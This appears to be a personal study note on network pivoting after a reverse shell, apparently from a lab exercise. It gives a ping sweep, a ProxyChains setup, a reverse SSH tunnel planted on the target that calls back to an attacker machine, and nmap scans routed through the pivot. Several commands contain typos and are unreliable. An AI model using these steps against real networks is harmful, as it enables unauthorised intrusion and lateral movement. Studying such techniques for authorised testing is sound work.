1. ## Sweeping the Pings
So we are in a reverse shell, escalated, and persistent. Now what? Wll we  are only on one machine inside the network and it's potentially a large network with juicy secrets, hidden files, and bitcoins. 

Once you know one IP address for a target, it's not hard to figure out that the rest of them are going to be on that network. We use a ping sweep to being to interact with local targets to find them. We accomplish with a command  that is a bash one-liner that attempts to ping each IP address on a network. In this example from 192.168.1.1 to 192.168.1.254

<span style="color:#ffc000">(Note. the .1 or .254 address is usually reserved for network devices like routers and these device can take a very long time to scan, so its advisable to skip them or put them in their own directoty)</span>

We will use the #pingsweep command of <span style="color:#00b050">for i {1..254}; do ping -c 192.168.1.$i | grep "bytes from" &); done</span> on our target machine. The purpose of this command is to perform a quick ping scan on a range of IP addresses (192.168.1.1 to 192.168.1.254) in a local network. The <span style="color:#00b050">grep</span> command filters the output to show only lines that contain "bytes from," which typically indicates a successful ping response.
![[Pasted image 20231210224250.png]]

2. ## Moving the Ping Info
We then move back to our attacker machine and create a file with #nano that you can copy and past the ping sweep info we just received. Here we will call it "ping_sweep"
![[Pasted image 20231210224601.png]]
Next we will want to just grab the ip address which is a simple enough procedure with the #awk <span style="color:#00b050">command of: cat ping_sweep | awk -F ":" '{print $1}' | awk -F " " '{print $4}'</span> which is extracting information from this file with lines containing fields separated by colons and spaces. It specifically prints the first field from the colon-separated part and the fourth field from the space-separated part on each line. So we've kept the information to the left of the ':' and the only kept the 4th line. Which is our IP addresses. After which it is sorted and put into a file called, say, targets, Which leaves us with: 
![[Pasted image 20231210225841.png]]
![[Pasted image 20231210231106.png]]

3. ## Making Target Directories and Files
We’re going to want to stay organized for every target we want to attack, and the best way is to make directories for each of them, we'll do this by the simple command <span style="color:#00b050">cat targets | xargs mkdir</span>
<span style="color:#ffc000">(The xargs command reads the input (which is the content of the file) and executes the mkdir command with each line as an argument. This effectively creates a directory for each line in the file.</span><span style="color:#ffc000">)</span> We will then see this:
![[Pasted image 20231210231518.png]]

After this we’ll want a scope file for each IP address directory and we can accomplish this by the #scope command<span style="color:#00b050"> for i in 192.* ; do echo $i > ./$i/scope; done</span> which for each item matching the pattern `192.*` in the current directory, the command creates a subdirectory with the same name as the item and writes the item's value to a file named "scope" within that subdirectory. The result is a set of subdirectories named after the items in the current directory, each containing a file named "scope" with the corresponding item's value. Here is the results. 
![[Pasted image 20231210232312.png]]

4. ## Pivoting and SSH Remote Proxy
So this is the meat and potatoes of pivoting. Everything before this was reconnaissance and organization. To actually pivot we need to set up a SSH tunnel and configure our proxy chains to allow the transfer of data smoothly. 

First we have to start #SSH with our #start-ssh command which is <span style="color:#00b050">sudo systermctl start ssh.service.
</span>
Next we need our firewall rule on the target network to forward the data to out listening port. Fortunately we have the firewall and familiarity with the rules section to add this and it is only a little bit different:
![[Pasted image 20231210233154.png]]
basically traffic will be directed to #SSH on port 22 and then to our selected port and then 4445 on our own attacker machine. 

Finally we need to setup our payload. This is a little bit different as we need to configure our ProxyChains. Simply put, <span style="color:#ffc000">ProxyChains is a tool that allows you to route network connections through multiple proxy servers or chains of proxies. </span>It is commonly used to enhance privacy and anonymity by obfuscating the original source of network traffic. The basic idea behind ProxyChains is to create a series or "chain" of proxy servers, and each connection passes through these proxies before reaching its destination.

Here's a simple breakdown of how ProxyChains works:
- **Configuration:** Users configure ProxyChains by specifying a list of proxy servers in a configuration file. Each proxy server is identified by its IP address and port number.
- **Chaining:** ProxyChains routes network traffic through a series of proxy servers based on the defined chain. Each connection is forwarded from one proxy to the next until it reaches the final destination.
- **Anonymity:** By passing through multiple proxies, the original source of the network traffic is obscured. This can help users hide their IP address and location.
- **Applications:** ProxyChains is often used with command-line tools and applications that don't have built-in proxy support. It is commonly employed for tasks such as web browsing, accessing online resources, or testing network security.

We'll need to access our ProxyChain configuration and we can do that with #nano and the command:<span style="color:#00b050"> sudo nano /etc/proxychains4.conf
</span>

<span style="color:#ffc000">Step number 1 is to uncomment dynamic chains and comment strict chains</span>, there by reversing the config.(Now the proxies jump chain we use will be different every time.)
![[Pasted image 20231210233850.png]]

<span style="color:#ffc000">Step 2 is to uncomment quiet mode</span> (making the chain sequence less verbose) <span style="color:#ffc000">and comment proxy dns</span> (we don't want dns proxy servers because they block unknown senders)
![[Pasted image 20231210234031.png]]

<span style="color:#ffc000">The last step is to change the proxy list from socks4 to socks 5 and port 9050 to port 9080</span>, this is simply to change it from the default TOR port which is often blocked.
![[Pasted image 20231210234057.png]]

Now we are free to setup our payload that we will put on our target machine and that #sss-shell command is here <span style="color:#00b050">ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 4445</span>

Finally we want to check that the port is listening and we can do that with our [[Basic command]] of <span style="color:#00b050">netstat -natp</span> and it looks like this:
![[Pasted image 20231210234903.png]]

5. Targeting Scans, Fast, Aggressive, Port, and Services
Now we return to our attacker machine’s “Desktop/pentest” and we have two way of doing these scans for our organized and ready pivot. The first way is doing it all at once, it takes longer but it is more automated the second is done manually and individually. 

### Automated
 So for our #fast-scan We will use the command <span style="color:#00b050">for ip in $(cat targets); do sudo proxychains nmap -F -sT -Pn $ip | tee ./ipfast_scan; done</span> and this for each IP address in the targets file, the script runs an Nmap scan using proxychains and saves the output to a file named ipfast_scan.

The other automated scans are much similar only a small change in syntax changes the type of scan:
#aggressive-scan <span style="color:#00b050">for ip in $(cat targets); do sudo proxychains nmap -A -Pn $ ip | tee ./$ip/all_scan</span>
#port-scan<span style="color:#00b050"> for ip in $(cat targets); do sudo proxychains nmap -p- -Pn $ ip | tee ./$ip/port_scan</span>
#service-scan <span style="color:#00b050">for ip in $(cat targets); do sudo proxychains nmap -sV -Pn $ ip | tee </span><span style="color:#00b050">./$ip/service_scan </span> (note the $ip should always be together there's a space for markdown language.)

### Manual
So for manual scans there is a little simpler syntax to our automated way you would simply remove the "for ip in $(cat targets);" and start with "sudo proxy chains and then the type of scan you wish for and then a tee to give it a file_name to go to" for instance a #solo-scan for the fast type would look like <span style="color:#00b050">sudo proxychains nmap -iL file_name/ipaddress -F -sT -Pn | tee fast_scan</span>

For length sake I will assume you have the smarts to figure our a #solo-scan for the other types. But the results will look something like this from your scans (below is a fast scan)
![[Pasted image 20231211001730.png]]

### Categorized Scans
But one specific type of scan that we should focus on is a scan that will categorize targets, let’s say we want to only scan for IPs that have SSH open. So, we target by “target service” rather than targets alone. Remember we have that “target” directory in our Pentest directory. Let’s use the #ssh-scan command of<span style="color:#00b050"> sudo proxychains nmap -iL targets -p 22,2222 --open -sT -Pn | tee ssh_servers</span> and that will make a result of: 
![[Pasted image 20231211002042.png]]

Don't forget to use your #awk and <span style="color:#00b050">sort</span> command so the end result looks like this: 
![[Pasted image 20231211002206.png]]

And that's pivoting. You're now ready to jump from one machine to another on your target network. Nice work. 